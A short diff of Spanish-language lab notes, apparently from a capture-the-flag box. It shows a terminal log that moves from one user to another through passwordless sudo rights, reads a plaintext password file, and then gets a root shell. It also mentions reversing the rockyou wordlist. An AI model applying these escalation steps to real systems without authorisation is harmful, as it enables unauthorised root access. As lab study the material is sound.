@@ -1,1 +1,27 @@
 
+tac -> darle la vuelta a rockyou.txt 
+
+tails@aea2bd9f04fc:~$ sudo -l
+User tails may run the following commands on aea2bd9f04fc:
+    (sonic) NOPASSWD: ALL
+tails@aea2bd9f04fc:~$ sudo -u sonic /bin/bash
+sonic@aea2bd9f04fc:/home/tails$ ls
+ls: cannot open directory '.': Permission denied
+sonic@aea2bd9f04fc:/home/tails$ cd ..
+sonic@aea2bd9f04fc:/home$ cd sonic/
+sonic@aea2bd9f04fc:~$ ls
+Documentos
+sonic@aea2bd9f04fc:~$ cd Documentos/
+sonic@aea2bd9f04fc:~/Documentos$ ls
+contraseña
+sonic@aea2bd9f04fc:~/Documentos$ cat contraseña 
+perritos!
+sonic@aea2bd9f04fc:~/Documentos$ sudo su -l
+root@aea2bd9f04fc:~# exit
+logout
+sonic@aea2bd9f04fc:~/Documentos$ sudo -l
+User sonic may run the following commands on aea2bd9f04fc:
+    (ALL) NOPASSWD: ALL
+sonic@aea2bd9f04fc:~/Documentos$ sudo -u root /bin/bash
+root@aea2bd9f04fc:/home/sonic/Documentos# 
+                                                  
